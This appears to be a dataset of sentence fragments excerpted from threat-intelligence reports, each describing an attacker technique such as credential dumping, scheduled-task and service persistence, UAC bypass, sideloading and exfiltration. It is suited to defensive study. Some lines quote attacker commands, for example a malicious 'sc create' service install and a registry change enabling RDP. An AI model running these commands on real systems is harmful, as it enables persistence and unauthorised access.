resulted in confirmed compromises of internet-facing Federal Government agency systems.
resulted in confirmed compromises of internet-facing Federal Government agency systems.
the actors leveraging CVE-2019-19781 to compromise Citrix Application Delivery Controllers.
attack of a Remote Desktop Protocol on a public-facing server.
cyber threat actors using external proxy tools
These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.
proxy tools depending on their intended use.
activity from a network proxy tool
Cyber threat actors also continue to identify large repositories of credentials that are available on the internet to enable brute-force attacks.
brute-force passwords.
threat actors using Mimikatz in conjunction with coin miner protocols and software.
The actors used Mimikatz to dump credentials from the OS using a variety of capabilities resident within the tool.
the actors using Mimikatz during their operations.
a brute-force attack of a Remote Desktop Protocol on a public-facing server.
such as a keystroke logger
file injection capability
actors to execute directory traversal attacks
or delete files
allows cyber threat actors to execute arbitrary system commands,
concealed programs and documents at innocuous-seeming locations on victim networks and in victim networks’ “recycle bins.”
The lures are designed to socially engineer the recipient to download and open an attached RAR file that contains either a Microsoft Compiled HTML Help (CHM) or Excel payload.
phishing emails that were used as lures to deliver the files
download further malware payloads
to download a next stage EXE payload using cURL
downloading of the next stage.
One scheduled task (shown below) runs every 15 minutes
C:\Windows\System32\schtasks.exe /create /sc MINUTE /mo 15 /TN
creates two different scheduled tasks.
Scheduled task
The second scheduled task created attempts to execute the payload downloaded by the other task: 
"C:\Windows\System32\schtasks.exe" /create /sc MINUTE /mo 20 /TN
create a scheduled task
C:\Windows\System32\schtasks.exe /create /sc minute /mo 15 /tn
used to create scheduled tasks for persistence
schtasks /create /tn WinSecurity /sc minute /mo 15
These payloads are compressed inside RAR files, this helps avoid static analysis techniques
The more common payloads contained within the RAR files are Microsoft Compiled HTML Help (CHM) files
The computer name
the computer name is sent to the C2
the username is also sent to the C2.
The computer name and the username is also sent to the C2.
the computer name is sent to the C2
plugins such as a keylogger,
remote access tool
file stealer
an encoded PowerShell command stage, obfuscating the activity further than just simple string concatenation.
Encoded PowerShell command
The decoded command
threat actors obtain initial access to networks is through the use of compromised valid credential pairs
often will search for directories on the network
remote desktop protocol (RDP) and secure shell (SSH) accesses
Threat actors will look for networks that have internet-facing servers running RDP and then exploit vulnerabilities in those servers
Exposed RDP servers are also abused by threat actors to gain initial access into a targets network.
use brute force password attacks
The server contained HTTP header data (SimpleHTTP/0.6 Python/3.8.10), indicating the use of a Python library called SIMPLEHTTPSERVER
The threat actor also engaged in brute-forcing against the victim's internal web services
brute forcing tool called FSCAN.
brute-force attacks on systems
brute forcing attempts on some of the internal FTP servers inside victim network
The database used a weak password and was susceptible to brute-force attacks.
threat actor used the Windows command-line arguments
received a command-line argument from attacker
Used to search for the string "DBPath" in all files within the current directory and its subdirectories
List of recently opened files and folders on the computer.
The threat actor uses stolen passwords from valid accounts
to escalate privileges using valid accounts
the reverse SOCKS proxy activity on the infected device using the open-source tool FRP.
After establishing the reverse SOCKS proxy connection,
The threat actor utilized open-source reverse proxy tools to expose local devices located behind a NAT or firewall, to the Internet.
Execution of FRP reverse SOCKS proxy on infected host.
Installation of malicious Windows service.
it will install a fake Windows service called “windowsupdate”
Malicious service installation is accomplished via the below command line argument:
sc create WindowsUpdate binPath= C:\Windows\Temp\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate
Maintain Presence via Windows Service Installation
To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload
installed a second stage persistence backdoor on infected device by abusing Windows Services.
This service executes a malicious binary (Cobalt Strike Cat payload) under “C:\Windows\Temp\svchost.exe” every time the victim device is started.
Windows services ran with the highest privilege, NT AUTHORITY\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence.
the threat actor used private proxy addresses from a Chinese underground proxy IP solution called 'Tigercloud Club' to conceal their real IP address.
Reverse proxy tool
Reverse proxy tool
Threat actor uploaded the fast reverse proxy (FRP) binary
One of the main initial access vector is exploitation of publicly exposed web services.
Initial Compromise Through Exploiting Publicly Facing Applications
the threat actor primarily focuses on four different known remote code execution (RCE) vulnerabilities during their operations:•    CVE-2023-21839      Oracle WebLogic Server RCE [13]•    CVE-2021-3129      Laravel debug mode RCE [14]•    CVE-2020-2551      Oracle WebLogic RCE [15]•    CVE-2021-44228     Apache Log4j [16]
the victim IP address was publicly serving a web service that contained a phpMyAdmin database.
The threat actor primarily focused on exploiting four different remote code execution (RCE) vulnerabilities to target web services
Decrypting and exporting browser data
the decryption key for the ZIP folder and access the tool
distributed inside an encrypted ZIP folder.
executed the "tasklist /SVC" command to list all running processes on the victim device.
deleted the LaZagne binary after execution to avoid detection from the user's side.
The actor leveraged ONE-FOX - a collection of pentest tools - to copy binaries from actor´s system to the victim.
Recording keystrokes in real time with offline logging available
Downloading files remotely
the dropper then downloads a custom XMRig miner
a script to download, configure and execute
to download the XMRig payload.
pulls the XMRig payload
generating a script to decode the legitimate Mach-O file.
is decoded and unarchived
This value is decoded
The Logic Pro X dropper binary is deleted with the /tmp/ bundle
In order to unpack the legitimate binary,
binary unpacks a customized Mach-O
previously written Base64 file
Files are dropped/downloaded as Base64-encoded archives.
The script first deletes itself from the disk.
removes any files
deleted every time
The script then removes any files
script removes the i2pd Mach-O file from the disk.
Even though the scripts produce many on-disk artifacts, the dropper and scripts are quick to remove them
Files are deleted after use.
to proxy the miner’s network communications.
mining proxy.
The usage of a proxy allows authors to control all of their mining implants and their target pools via a centralized console
the mining proxy
command line arguments
is executed as a command line argument
The padded i2pd Mach-O file
pads the resulting Mach-O with a random number of \x00 bytes
binaries are padded with a random number of zero bytes to change its hash and expand its size.
is padded with a random number of \x00 bytes.
the user will continue to execute the dropper
The dropper is executed by the user.
As long as the dropper successfully launches its legitimate application
The dropper bundle in the applications folder appears legitimate,
The authors cleverly utilized these legitimate dependencies via symbolic links when dynamically creating the legitimate bundle in the temp folder.
The dropper is installed into a legitimate file path, posing as the legitimate application.
utilize legitimate file paths to mask their execution.
In order to appear as a working copy of Logic Pro X, the dropper contains a legitimate copy of the lure application
The mirrored bundle contains the legitimate application instead of the dropper binary.
to mirror all directories found in /Applications/Logic Pro X.app/Contents and /Applications/Logic Pro X.app/Contents/MacOS to their respective /tmp/ locations
The malicious dropper contains a legitimate version of the software and executes it to give the illusion of a properly behaving application.
a check using pgrep for Activity Monitor processes
This proxy server is located on the I2P network at the destination of the pool tunnel
config via the XMRig miner’s native API.
By modifying the below registry value EnableLUA to “0”
The ConsentPromptBehaviorAdmin key has been set to “0”, indicating that the behavior of the consent prompt for actions requiring administrator privileges has been modified
the ransomware modifies specific registry values
malware aims to deactivate User Account Control (UAC) on the target system
UAC BYPASS
to disable User Access Control (UAC), a security feature in Windows
By deactivating UAC, the ransomware gets elevated privileges without requiring user permission or administrator credentials
After bypassing UAC
the ransomware uses the FindFirstVolumeW() and FindNextVolumeW() API functions
using the FindFirstFileW() and FindNextFileW() API functions.
the malware leverages various functions from the CryptoAPI, including CryptAcquireContextW(), CryptImportKey(), CryptSetKeyParam(), and CryptEncrypt().
using the MoveFileExW() API function,
to search and identify accessible volumes on the targeted system.
the malware proceeds to identify files and directories for encryption by iterating through them
This function scans a specified path by finding all files within the given directory and its subdirectories.
then iterates over each volume to search for specific files related to virtual machines.
This function scans VM volumes on an ESXi server.
scanning files in a specified or generic path
then iterates over each volume to find files
command uses the Windows Management Instrumentation Command-line (WMIC)
This function is responsible for deleting all files and directories in the user’s trash folder.
by passing the file path to be encrypted as an argument.
It removes log files and temporary files from the root directory.
It also deletes the ransomware, script file, and ransom note (index.html), ensuring that no evidence remains on the compromised system.
It uses the esxcli command to list all VM processes
configuring autorun entries,
through legitimate remote access software such as AnyDesk
invoked the wave 2 ransomware immediately from the command line
both use CreateFile and WriteFile APIs
using DeviceControl API methods
use of the same DeviceControl API methods
DeviceControl API methods
DeviceControl API methods
ransomware attempts to decrypt
RC4 key for decryption
the RC4 decryption method uses CryptoAPI (CryptDecrypt) instead of the usual substitution box method
execute embedded scripts
Embedding of EldoS RawDisk driver inside the wiper malware
the threat actor embedded the signed raw disk driver in the wiper executable
the raw disk driver was embedded inside the malware
the download and launch of a suspicious batch file.
the actor introduced a downloader to fetch and spawn the next stage payload
the malicious document connects to the remote server and downloads the payload
install additional malware
They then returned 18 hours later to install further malware
when the malicious Word document opens it fetches the next payload from the remote server:
it fetched an additional script payload
a different method of fetching and executing the next stage payload
a file downloaded from the internet,
fetch the next stage payload.
If the fetched data by cURL command
Fetch the payload with cURL command
fetching the next stage payload
fetching a remote payload
fetches a payload from the embedded URL and loads it.
launch of a suspicious batch file.
Windows Batch script
the operator executed several Windows commands
cmd.exe /c
cmd /c
cmd /c
batch file
The batch file name
the scriptlet of the batch file
cmd.exe" /c
cmd.exe" /c
Windows Batch file
This script is for executing the PowerShell script via a Windows scheduled task
Windows displays a warning message when the user tries to open a file downloaded from the internet.
strategy to persuade the victim to execute the malicious shortcut file
executed when the victim double-clicked on the shortcut file
the executable ieinstal.exe was used to bypass UAC.
one victim in the UAE was attacked using a malicious Word document
to gather basic system information.
rundll32.exe
spawns it with the rundll32.exe command with the payload URL
Embedded files of ISO image
an encrypted Dump.bin file
downloader contains an encrypted configuration at the end of the file.
the supplied encrypted decoy document.
an encrypted decoy document
The PDF and executable files have numerous spaces before the file extension to hide it and allay suspicions.
decodes 0x3E8 bytes with that key
The decrypted data
loads the decrypted DLL file
The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.
the malware decrypts the payload with a delivered 64-byte RC4 key.
the decrypted payload
checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender
If TrendMicro, BitDefender, or Windows Defender products are installed
If Windows Defender or Bitdefender Antivirus is installed on the victim’s computer
depending on the antivirus installed.
the malware can disable the functionalities of EDR/AV products.
injects the fetched payload into the explorer.exe process
The Blockchain.pdf file is a malicious HTML application file
This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address
The campaigns used a variety of email attachments such as Microsoft OneNote attachments and somewhat rare to see .URL attachments,
This campaign began with thread hijacked emails which contained HTML attachments.
The HTML attachments used HTML Smuggling to drop a password protected, zipped Windows Script File (WSF).
to download and execute an intermediate script which then downloaded and executed the Standard IcedID Loader using a non-standard export “init”.
used to download and execute an IcedID loader.
opened it would initiate the download of a batch (.bat) file.
The batch file would download and execute
When opened, the OneNote document instructed the recipient to "open" the document by double-clicking the button displayed in the OneNote document.
file was concealed beneath the "open" text which, if clicked, executed the HTA file.
containing the encrypted bot and DLL loader.
download of a batch (.bat) file.
The batch file would download and execute
that contained various bat files,
execute an IcedID loader with rundll32
loader with rundll32
Config decryption within IcedID Lite Loader.
Decryption of the URI within
The domain is decrypted from the configuration and the URI path is decrypted within the function
Decryption is the same across both
This pattern of decrypting strings
the Forked Loader decrypts and copies strings into global variables where they will be later used to resolve required functions.
Decryption of the config buffer in the Forked Loader.
With the config decrypted
The response gets decrypted with the IcedID decryption routine,
Contains code to decrypt strings and domains
String decryption of the DLL names
With the DLL strings decrypted, the malware then decrypts the loader configuration by taking the first 64 bytes and XORing it against the next 64 bytes.
The first four bytes of the decrypted buffer will contain the project identifier
This function decrypts strings
decrypts the DLL strings to be used later to resolve handles to the DLLs needed
The strings are decrypted in the same algorithm where the data is split into DWORDs and XOR’d against a random key.
String decryption for the DLL names needed for execution.
Decryption of “Lite Loader”" domains.
a function is called that decrypts strings that
there are two domains that are decrypted:
With the domain names decrypted, the DLL Loader decrypts 10 strings that should be URIs to be appended to the domains.
Decryption of “Lite Loader” filenames.
After the strings are decrypted
Base64 decoding this value
following base64 decoded header
showing the decrypted botpack structure.
that makes the HTTP request.
sends an HTTP request that will contain the encrypted bot response.
contain the host information
The Base-64 encoded segment
may also deliver a weaponized Office document that executes the ReconShark reconnaissance malware.
to distribute password-protected weaponized Office documents
Office documents weaponized
hardware information.
to use this tool for remote management of its infrastructure.
webshells, mostly obfuscated,
the hacker also changes the content of the file RedirSuiteServiceProxy.aspx to webshell content.
RedirSuiteServiceProxy.aspx is a legitimate file name available in the Exchange server.
the attacker downloads files,
drops suspicious files on the attacked servers
collecting information on the system,
“cmd” /c
cmd /c
the standard Windows command line tool cmd.exe.
Delete file or folder
the hacker also injects malicious DLLs into the memory,
the DLL was injected into the memory of the svchost.exe process
executes these files through WMIC.
, the above files no longer exist on the compromised system, possibly due to the hacker’s evidence deletion.
Decrypt the request received using AES algorithm
After decoding,
creates a listener that listens for connections to port 443 at the path https://*:
This method is responsible for collecting system information
Information such as operating system architecture, framework version, operating system version, etc.
listing directory and file information in the format
 D|-|&lt;Date created&gt; |&lt;Date modified&gt; |&lt;folder or file name&gt;
reading files
Sending and receiving data with C2 using the RC4 encryption algorithm where the key will be generated at runtime.
delivered via phishing email as an attachment
The archives often include a JavaScript (.js) file
likely exploited known vulnerabilities in unpatched applications for initial access
gains access to the targets through remote exploitation of an unpatched internet-facing device.
to perform initial intrusion leveraging exposed vulnerable applications, for example, continuing to exploit Log4j 2 vulnerabilities in unpatched systems in
Installing legitimate remote access tools, such as RPort, Ligolo and eHorus
common native Windows tools and commands such as netstat
Windows Management Instrumentation (WMI) to launch commands on devices
Remote scheduled tasks to launch their customized PowerShell backdoor
to register a scheduled task used to launch the ransomware payload.
The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.
GPO was leveraged again to register a scheduled task used to launch the ransomware payload.
first interfered with security tools using Group Policy Objects (GPO).
the threat actors leveraged highly privileged credentials and access to domain controllers
The threat actors used the compromised administrator account
the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.
the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.
The first account was the compromised Azure AD Connector account,
the threat actors were observed using compromised credentials to access the Azure AD Connect device.
authentication from a known attacker IP address into the Azure AD Connector cloud account.
the threat actors executed multiple actions in the cloud using two privileged accounts.
The Azure AD Connector account and the compromised administrator account were then used to perform
a successful sign-in to the Microsoft Azure environment was observed.
The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.
the threat actors leveraged RDP for access into the account.
the threat actors accessed it through RDP, which is an open session that evades MFA blocking their activities.
Those files will still get executed, if the user clicks on run
Full path to file and hidden files
As LSASS dumps are nowadays recognized by the dump file itself
LSASS dump in c:\tmp detected and deleted
LSASS dump in the WebDAV detected
done via the GetAsyncKeyState API,
this is done via the popen API
uses Windows API functions to execute files
This is done via the GetAsyncKeyState API, with keystrokes being logged
keylogging are enabled by default,
logs keystrokes for windows with titles containing substrings specified in its configuration
Window titles to keylog
can log keystrokes.
Screenshots are also taken at a configurable interval; the default is once every 30 seconds.
Screenshots and keylogging are enabled by default,
can capture screenshots
the shellcode is stored in files instead of the registry, and the stored shellcode is loaded and executed on Dolphin’s startup
The backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\&lt;random_run_name&gt;\”%appdata%\Python27({32|64})\pythonw.exe” “&lt;loader_step_1&gt;” “&lt;loader_encrypted_step_2&gt;”
uses Run keys for persistence of its loader
can execute shell commands
creates directory listings
The command to get specific files
It creates directory listings
to get files from drives
it searches the drives of compromised systems for interesting files
can obtain file and directory listings.
The following file extensions of interest, specific to media, documents, emails, and certificates,
can collect files from local drives.
Username
obtains the victim’s username.
Computer name
RAM size and usage
OS version
obtains various system information including OS version, computer name and RAM size.
List of installed security products
obtains a list of installed security software.
Local and external IP address
obtains the device’s local and external IP address.
XOR-decrypts an embedded PE file
XOR-decrypts further shellcode carried within itself,
XOR-decrypts its contents,
a decrypted configuration
injects it into the created process
in a specified separate process that is created and injected.
and inject processes.
it creates a one-time scheduled task.
uses a temporary scheduled task to start after installation.
After execution, the output of commands is uploaded.
exfiltrates data to Google Drive storage
it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.
exfiltrates data to Google Drive.
The shellcode is stored in the registry,
sending an HTTP POST request
uses HTTPS to communicate with Google Drive.
staging the data in encrypted ZIP archives before upload.
stages collected data in a directory before exfiltration
The content is encrypted using AES CBC with random 16-byte keys and IVs,
Most strings in this version are base64 encoded.
The base64-encoded strings were plaintext again in this version.
has encrypted components.
another shellcode, XOR-decrypts an embedded PE file – the Dolphin backdoor – and loads and executes it using a custom PE loader.
which is vulnerable to a DLL side-loading vulnerability, and loads a file
sideloading different DLL names, and multiple binary files names being loaded by those DLLs.
the executables and sideloaded files
Side-loaded DLL name
a threat actor abusing a sideloading vulnerability
Name of the malicious side-loaded DLL
Name of the executable vulnerable to side loading
seemingly legitimate executables and their respective sideloaded files
encoded shellcode
Creates a memory section with the DES-encrypted malware configuration
to obfuscate their malware.
used VMProtect to obfuscate one of them.
that decompresses and loads the first stage in memory.
shellcode decompressing and loading
there was only one stage being decrypted in memory
the malware decrypts the saved passwords
and then decrypts them
and then decrypts the content
calls Stage 1 again via process hollowing with four parameters
It then runs Stage 2 via process hollowing.
creates a registry key
a service that launches the moved executable rc.exe with one parameter.
Screenshot grab
Drive information retrieval
browses a directory
Process manager (browses and terminates processes)
Current process ID
deletes,
uploads, downloads a file
Command execution
by calling the GetNetworkParams API function
Collected machine information includes the following:
Randomly generated GUID
Hostname
Processor architecture
Operating system version
Username
Local IP address and port used to send the network packet
The configuration is encrypted with a hardcoded DES key and is a few bytes long
the malware retrieves information on the infected machine and sends it to the C&amp;C encrypted with DES.
information is sent to the C&amp;C, encrypted with a hardcoded key and DES CBC algorithm:
the malware retrieves information on the infected machine and sends it to the C&amp;C
Then, the malware retrieves information on the compromised computer and sends it to the C&amp;C.
used as a lure to entice the victim into opening the malicious file.
to extract the URL, login, and password fields from the file
Name of the hardcoded directory where files are copied
The malware also established persistence on the host with the creation of a registry run key.
persistence was achieved by creating a ‘Run’ key
These files were transferred to the domain controller over SMB.
dumped lsass memory on the domain controller.
We observed a process created by Cobalt Strike accessing lsass.exe
is a known indicator of such tools as Mimikatz
most likely using credentials gathered by the previous LSASS access.
then proceeded to access lsass memory on the host to extract credentials.
the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller.
after completing RDP connections to various hosts on the network
which were started via their interactive RDP session
RDP was also used by the threat actor
The threat actor was able to RDP to a backup server
running processes were reviewed
the threat actors checked running processes on the accessed hosts via taskmanager
checking on running tasks,
the new drive contained a LNK file 6570872.lnk and hidden folder “me”.
The contents of hidden folder “me”, included several files and folders that were used for the execution
the folder included a legitimate copy of rundll32.exe
rundll32.exe binary downloaded approximately 0.4 MB of data.
using a renamed copy of rundll32.
Batch script to run
file would execute a batch script
C:\Windows\syswow64\cmd.exe /C
An instance of cmd.exe was launched through explorer.exe which ran the following command
cmd.exe session
The threat actor also used a batch script to collect a list of all computer objects on the domain using C:\Windows\system32\cmd.exe /C adcomp.bat which contained the PowerShell command:
Once the user had mounted the ISO and the LNK file was executed by the user, the complex execution flow started.
The names of the registry values changed
The last registry key was used to store additional PowerShell code.
This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc
the threat actor injected into various processes
reg.exe query
started a BITS job to download a Cobalt Strike beacon
whoami
whoami  /groups
ipconfig /all
threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig
systeminfo
systeminfo
WMI was used to pivot to a domain controller on the network.
The actor leveraged Impacket’s wmiexec.py to execute commands with a semi-interactive shell
interacts with remote endpoints via WMI
a number of WMI requests via DCERPC from one endpoint to a target endpoint based on the ports.
the ‘Powershell.exe’ process initiated the WMI requests.
One of the observed commands invoked via WMI was ‘firefox.exe’.
The commands executed included directory traversal,
Tool Used to Steal Sensitive Information
proxying the traffic
initiating a proxied
Several HTTP Post events were observed to the identified domains
HTTP stream containing the content
The POST event included a MIME part indicating file upload
The file that was uploaded 775E.bin was deleted by the injected ‘Explorer.exe’ process from the target endpoint
The threat actor was able to RDP to a backup server using the admin credentials they acquired.
This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to perform process injection of shellcode
shellcode stored in Base64.
The mounted file contains a hidden folder
a 200+MB padded file
padding the contents with benign data
It included a standalone file padded with over 200MB of blank spaces, likely to impede analysis of the decompressed ISO file.
executes a CMD file
The CMD file contains commands
which use certutil (renamed here as slaughterhouse.exe) to decode
The decoded DLL
thus requires two rounds of decoding using certutil.
chaining together a series of scripts to decode
The victim double clicks the ISO to mount it
Victims can be lured into clicking executable content including binaries, scripts or shortcut files masquerading as benign filetypes such as PDFs or folders.
DLL is then executed using rundll32
and injects Qakbot into wermgr.exe.
This file is base64 twice,
or unpack the final payload
modifies registry keys to maintain persistence,
Modifies the Windows registry
modifies the Windows Registry to allow remote desktop connections
establishes persistence through the creation of two keys in CurrentVersion\Run.
Creates registry key for persistence only
Creates two registry keys for persistence
Keys found in CurrentVersion\Run contain references to programs that will execute when a user logs in.
operators install and execute remote access tools such as Splashtop on targeted systems.
remote monitoring and management (RMM) software
operators use Splashtop to transfer malicious tools from computer to computer in the victim’s environment.
It copies other malicious batch and EXE files from a compromised internal Server Message Block (SMB) server to the newly created temp folder
operators utilize RDP to move laterally in the victim’s environment.
Modifies the Windows registry to allow remote desktop connections.
operators open up an Remote Desktop Protocol (RDP) port
operators use Mimikatz to dump passwords.
operators use Mimikatz to dump passwords from LSASS.
Mimikatz, which is a tool used for extracting sensitive information such as passwords and authentication credentials from a Windows operating system.
Mimikatz being leveraged maliciously by threat actors in the following ways:
Credential Loading
Mimikatz loads credentials from various sources such as Windows memory, Local Security Authority Subsystem Service (LSASS) process
Mimikatz allows the user to manipulate the dumped credentials,
is a small, UPX-packed password protected binary
This version of Mimikatz has been compressed using UPX
While UPX is often legitimately used to reduce file size, we have observed threat actors utilizing UPX and other packing programs to evade static detection of the underlying payload.
operators use UPX to pack DC2.exe and DC4.exe to avoid static signature detection.
the batch file makes the following changes to the system
executes an embedded batch file.
is a batch script
is a batch script that creates a new user
creates a batch script that,
creates a batch script
Disables the User Account Control (UAC)
Attempting to use sc stop and taskkill to stop over 100 services related to various areas ranging from remote desktop tools to Windows Defender
The HTML code in this file contains embedded JavaScript functionality,
cleanup script used to remove evidence of the attack on a system
cleanup scripts from other threat actors are usually smaller and more specific to the tools used by that actor.
adds an additional layer of obfuscation to the code
password-protected executables to obfuscate malware
operators used Splashtop – a remote access and management (RMM) tool – to transfer the following malware into the target’s environment.
operators use Splashtop to move laterally and transfer malware between compromised hosts in the victim’s environment.
utilize Splashtop to transfer netscan.exe, netscan.lic, netscan.xml, newuser.bat, start.bat and turnoff.bat.
operators delete files such as mim.exe, mim32.exe, zam.exe and zam.bat to cover their tracks
hid the installer for Advanced Port Scanner within Inno Setup installer to evade static signature detection.
employing a combination of outdated Microsoft Office document vulnerabilities
exploit vulnerabilities in Microsoft Word’s Equation Editor
leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017-11882, within the Equation Editor of Microsoft Office
employs a forged document linked to G7 to target various governments within the G20 forum.
spam email comprising an attached MS Office document
employ the remote template injection method to retrieve the next stage of the malware from the TA’s Command-and-Control (C&amp;C) server.
download of a new payload from the attacker’s remote server
download a backdoor module.
downloads and executes a malicious backdoor
enables the TAs to create customized documents containing embedded objects that exploit vulnerabilities in Microsoft Word’s Equation Editor
drops an embedded payload, which is a DLL file
includes both an encrypted payload and shellcode
encrypts the collected information using RC4 encryption with the key “xkYgv127” and encodes it using base64.
proceeds to decrypt
scheduled task entry,
executes the export function “StartA” from the DLL
using rundll32.exe
utilizing the “rundll32.exe” command
loader is executed through rundll32.exe
hostname, operating system name, OS version, username,
Gather computer-specific information such as computer name, username, gateway address, network adapter details, Windows version, and user type
Internet information,
Retrieve TCP/UDP tables
the presence of any installed anti-virus software on the machine.
encrypted data is then exfiltrated using the below C&amp;C URL
encrypted data is then exfiltrated using the below C&amp;C URL
C&amp;C server responds with the next stage executable
loader establishes a connection with a C&amp;C server in the final stage of the attack.
Capture screenshots of victims’ system
Obtain information about processes and services running on the machine
Retrieve information about registry keys
using the remote process execution tool PSExec to execute batch files
Copy down batch scriptsExecute batch scripts
defaultChanges the Windows Shell from Explorer to their malicious script
exe└──cmd.exe: C:\Windows\system32\cmd.exe /c ""rdp.bat"
executes the shell (file2.bat),
tries to start its defined shell which has been swapped to a batch script (file2.bat) by the malicious actor.
Command line flags may be used to change this behavior and invoke one or more of the modules.
that would cause registry changes
reg.exe: reg  add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /
Sets various registry values
to enable Remote Desktop sessions (RDP) using reg.exe.
the malicious actor retrieved system administration tools and malicious payloads by using the Background Intelligent Transfer Service
Storing the ransomware within a 7zip encrypted archive
encrypted archive containing the ransomware,
a decompression utility to extract the ransomware
drop the defenses of the victim, inhibit monitoring, disable networking
stops specific defensive services (Windows Defender, etc)
Will also skip enumeration and stopping of antivirus software.-
to authenticate to the site behind the onion link on the TOR network
 ShellExecuteA is also used to launch
API call attempts to processes:
 The local module utilizes the LookupPrivilegeValueW and AdjustTokenPrivileges that Windows API calls on its own process via GetCurrentProcess and OpenProcessToken to obtain SeDebugPrivilege privileges.
using Active Directory group policies allows the malicious actor to hit all systems in the environment for as long as that group policy is active in the victim’s environment.
Potential Process Hollowing
more sophisticated encryption
this technique for encryption-decryption is easily more discernable during analysis because both the encrypted data and the mapping are in the same file
for its execution technique of hiding malicious code inside log files.
The bytes of the encrypted section is a specific index on the byte map
Though this is a very rigid method of hiding its codes,
uses byte remapping to ensure that the shellcode cannot be easily decrypted without the correct byte map
usually the encrypted payload
shows that their offsets within the encrypted region remain the same since they result in a similar shellcode even if they are composed of different bytes per binary.
The malware checks if there are monitoring tools, specifically Process Monitor, running in the current machine with the following strings:
procmon
procmon64
procmon64a
checks for a few installed and active antivirus products, namely:
Windows Defender
ESET
the malware proceeds to decrypt the PowerShell code
Furthermore, since the data to be decrypted is in another file, the routine becomes even more difficult to investigate, as analysts would need the correct pair for decryption.
Afterward, the shellcode will then decrypt and load the main ViperSoftX DLL embedded within the carrier.
Moreover, all the strings, binaries, and other relevant data within the ViperSoftX DLL also gets decrypted the same way.
The actual bytes of the decrypted shellcode
to crawl through different paths in the system
scans for these cryptocurrency wallets in local directories:
Armory
Atomic Wallet
Binance
Bitcoin
Blockstream Green
Coinomi
Delta
Electrum
Exodus
Guarda
Jaxx Liberty
Ledger Live
Trezor Bridge
the use of DLL sideloading for its arrival and execution technique.
found in the sideloaded DLL.
the sideloaded DLL),
DLL sideloading
While other cybercriminals use sideloading to load another non-binary component
We have also found that each sideloader DLL has its own pair of executable and byte map,
It still downloads a PowerShell code
or Windows Scripting
File-packed Magniber ransomware
To obtain the credentials, the team took a snapshot of lsass.exe
with a tool called nanodump, exported the output, and processed the output offline with Mimikatz.
The team obtained the cached credentials from a SharePoint server account by taking a snapshot of lsass.exe with a tool called nanodump, exporting the output and processing the output offline with Mimikatz.
They then used forged credentials to move to multiple hosts across different sites in the environment and eventually gained root access to all workstations connected to the organization’s mobile device management (MDM) server.
The team used this root access to move laterally to SBS-connected workstations.
team attempted to determine valid accounts based on group name and purpose
The team attempted to leverage these credentials
From that host, the team moved laterally to a misconfigured server, from which they compromised the domain controller (DC).
with a button, which, when clicked, downloaded a “malicious” ISO file
After the download, another button appeared, which, when clicked, executed the file.
Users downloaded and executed the team’s initial access payloads after clicking buttons to trigger download and execution.
they used compromised workstation and domain admin accounts
Use a previously compromised workstation admin account
Use a previously compromised domain admin account
the team leveraged compromised workstation and domain admin accounts to execute a payload
the team compromised a domain admin account and used it to laterally to multiple workstations and the DC.
they used compromised workstation and domain admin accounts to upload a payload via SMB on several target Workstations and the DC.
Use a previously compromised workstation admin account to upload and execute a payload via SMB
Use a previously compromised domain admin account to upload and execute a payload via SMB
The team’s C2 redirectors used HTTPS reverse proxies to redirect C2 traffic.
The team used HTTPS
the HTTPS beacon
post-exploit tool that leverages HTTP protocols for C2 traffic.
used HTTPS reverse proxies to redirect C2 traffic
Establish a session that originates from a target Workstation system directly to an external host over a clear text protocol, such as HTTP.
Establish a session that originates from a target Domain Controller system directly to an external host over a clear text protocol, such as HTTP.
used HTTPS reverse proxies to redirect C2 traffic.
the team uploaded and executed well-known malicious files
to download and execute a payload
Upload and execute a well-known (e.g., with a signature) malicious file to a target DC system
used redirectors to redirect C2 traffic between the target organization’s network and the team’s C2 servers.
used HTTPS reverse proxies to redirect C2 traffic between target network and the team’s Cobalt Strike servers.
The team used these platforms to create flexible and dynamic redirect servers to send traffic to the team’s Cobalt Strike servers
The redirectors used HTTPS reverse proxies to redirect C2 traffic between the target organization’s network and the Cobalt Strike team servers
The team used domain fronting to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating.
The team used domain fronting [T1090.004] to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating
This technique, which also leverages CDNs, allows the beacon to appear to connect to third-party domains, such as nytimes.com, when it is actually connecting to the team’s redirect server
This technique leverages CDNs associated with high-reputation domains so that the malicious traffic appears to be directed towards a reputation domain but is actually redirected to the red team-controlled Cobalt Strike servers.
which prompted DC authentication to the SharePoint server using the server’s NTLM hash. The team then deployed Rubeus to capture the incoming DC TGT
The team performed an NTLM-relay attack to obtain the DC’s TGT, followed by a golden ticket attack on a SharePoint server with Unconstrained Delegation to gain the ability to impersonate any Site 1 AD account.
The team ran the DFSCoerce python script, which prompted DC authentication to a server using the server’s NTLM hash. The team then deployed Rubeus to capture the incoming DC TGT.
The team ran the DFSCoerce python script, which prompted DC authentication to a server using the server’s NTLM hash
In some instances, they used Windows Management Instrumentation (WMI) Event Subscriptions
The team used WMI Event Subscriptions to move laterally between sites.
command-line tool
which stored credentials in a database file.
searched files on the server, and found plaintext credentials
